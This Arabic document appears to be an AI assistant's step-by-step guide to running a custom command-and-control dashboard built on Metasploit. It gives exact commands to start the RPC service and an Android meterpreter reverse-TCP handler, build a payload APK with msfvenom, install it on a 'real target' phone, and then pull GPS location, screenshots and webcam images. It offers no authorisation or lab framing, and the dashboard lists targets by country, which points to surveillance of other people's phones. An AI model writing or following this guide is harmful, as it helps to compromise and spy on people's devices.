# دليل التشغيل خطوة بخطوة - بدون كلام نظري

## الخطوات بالضبط:

### الخطوة 0: التثبيت (مرة واحدة فقط)
```bash
cd hamza_sku_metasploit_c2
chmod +x complete_setup.sh
./complete_setup.sh
```

إذا نجح، انتقل للخطوة 1.
إذا فشل، أعطني الـ output.

---

### الخطوة 1: تشغيل Metasploit RPC

**افتح terminal جديد (Terminal 1):**
```bash
msfrpcd -P msf_password -S -a 127.0.0.1
```

**يجب أن ترى هذا بالضبط:**
```
[*] MSGRPC Service:  127.0.0.1:55553
[*] MSGRPC Username: msf
[*] MSGRPC Password: msf_password
[*] MSGRPC starting on 127.0.0.1:55553 (NO SSL)
```

**إذا لم تر هذا:**
- اكتب: `which msfconsole`
- إذا لم يظهر شيء → Metasploit غير مثبت

**اترك هذا Terminal مفتوح.**

---

### الخطوة 2: تشغيل Dashboard

**افتح terminal جديد (Terminal 2):**
```bash
cd hamza_sku_metasploit_c2
python3 c2_server.py
```

**يجب أن ترى:**
```
╔═══════════════════════════════════════════════════════════╗
║            🔥 HAMZA SKU - C2 DASHBOARD 🔥                 ║
║   Professional Metasploit Integration Platform           ║
╚═══════════════════════════════════════════════════════════╝

📍 Dashboard URL: http://localhost:5000
🔐 Master Password: hamza_sku_2026

⚠️  IMPORTANT: Start Metasploit RPC first:
    msfrpcd -P msf_password -S -a 127.0.0.1

💡 Dashboard will connect to Metasploit when you start the Handler

✅ Server starting...

 * Running on all addresses (0.0.0.0)
 * Running on http://127.0.0.1:5000
```

**إذا رأيت خطأ:**
```
ModuleNotFoundError: No module named 'XXXXX'
```
→ شغّل: `pip3 install --user XXXXX`

**إذا رأيت:**
```
Address already in use
```
→ شغّل: `lsof -i :5000` ثم `kill -9 <PID>`

**اترك هذا Terminal مفتوح.**

---

### الخطوة 3: فتح المتصفح

**اذهب إلى:**
```
http://localhost:5000
```

**يجب أن ترى صفحة Login مع:**
- خلفية سوداء
- Matrix animation
- حقل password
- زر "ACCESS PLATFORM"

**إذا لم تفتح الصفحة:**
- تأكد أن Dashboard شغال في Terminal 2
- جرّب: `curl http://localhost:5000`
- إذا فشل → Dashboard غير شغال

---

### الخطوة 4: تسجيل الدخول

**في صفحة Login:**
1. اكتب في حقل Password: `hamza_sku_2026`
2. اضغط زر "ACCESS PLATFORM"

**يجب أن يحدث:**
- الزر يتحول لـ "✅ ACCESS GRANTED"
- تنتقل تلقائياً لصفحة Setup
- URL يصبح: `http://localhost:5000/setup`

**إذا لم ينجح Login:**
- افتح Developer Tools (F12)
- اذهب لـ Console tab
- أعطني أي أخطاء تراها هناك

---

### الخطوة 5: إعداد Handler

**في صفحة Setup:**

املأ الحقول:
```
LHOST: 0.0.0.0
LPORT: 4444
PAYLOAD: android/meterpreter/reverse_tcp
```

**اضغط زر "START HANDLER"**

**يجب أن ترى:**
- Status يتحول من "STOPPED" لـ "RUNNING"
- رسالة "Handler started successfully"

**في Terminal 2 (حيث Dashboard شغال) يجب أن ترى:**
```
[+] Connected to Metasploit RPC (SSL)
[+] Handler started: 0.0.0.0:4444
```
أو:
```
[+] Connected to Metasploit RPC (No SSL)
[+] Handler started: 0.0.0.0:4444
```

**إذا رأيت:**
```
[-] Failed to connect to Metasploit RPC
```
→ تأكد أن msfrpcd شغال في Terminal 1

---

### الخطوة 6: إنشاء Payload

**في terminal جديد (Terminal 3):**
```bash
msfvenom -p android/meterpreter/reverse_tcp \
  LHOST=YOUR_IP \
  LPORT=4444 \
  -o payload.apk
```

**استبدل YOUR_IP بـ IP الحقيقي:**
```bash
# لمعرفة IP:
ip addr show | grep "inet " | grep -v 127.0.0.1
# أو:
ifconfig | grep "inet " | grep -v 127.0.0.1
```

**مثال:**
```bash
msfvenom -p android/meterpreter/reverse_tcp \
  LHOST=192.168.1.100 \
  LPORT=4444 \
  -o payload.apk
```

---

### الخطوة 7: اختبار بـ Target حقيقي

1. انقل `payload.apk` لجهاز Android (عبر USB أو Download)
2. ثبّت الـ APK على الجهاز
3. افتح التطبيق على الجهاز
4. ارجع لـ Dashboard في المتصفح
5. اضغط على "Dashboard" في القائمة

**يجب أن ترى:**
- Target جديد يظهر في الجدول
- IP address
- Country flag
- Platform (Android)
- Status: Active

**اضغط على Target لفتح Session Control**

---

### الخطوة 8: استخدام Quick Modules

**في صفحة Session Control:**

جرّب الأزرار:
- **System Info** → معلومات النظام
- **Location** → موقع GPS
- **Screenshot** → صورة للشاشة
- **Webcam** → صورة من الكاميرا

**يجب أن ترى:**
- Output يظهر في الـ Terminal
- النتيجة تظهر في الصفحة

---

## الاختبار السريع (بدون Target حقيقي):

إذا أردت التأكد من أن كل شيء يعمل بدون جهاز Android:

**في Terminal 3:**
```bash
# اتصل بـ Handler يدوياً:
msfconsole -q -x "use exploit/multi/handler; set PAYLOAD android/meterpreter/reverse_tcp; set LHOST 0.0.0.0; set LPORT 4444; exploit"
```

**في Terminal 4:**
```bash
# محاكاة Target:
msfvenom -p android/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f raw | nc 127.0.0.1 4444
```

هذا لن ينشئ session حقيقي لكن سيختبر Handler.

---

## الملخص:

1. ✓ شغّل msfrpcd
2. ✓ شغّل Dashboard
3. ✓ افتح http://localhost:5000
4. ✓ Login بـ hamza_sku_2026
5. ✓ Start Handler
6. ✓ انشئ payload
7. ✓ ثبّت على Target
8. ✓ شاهد Target في Dashboard

---

## إذا فشلت أي خطوة:

أعطني:
1. رقم الخطوة التي فشلت
2. الـ output الكامل من Terminal
3. أي أخطاء في Browser Console (F12)

وسأعطيك الحل المحدد.
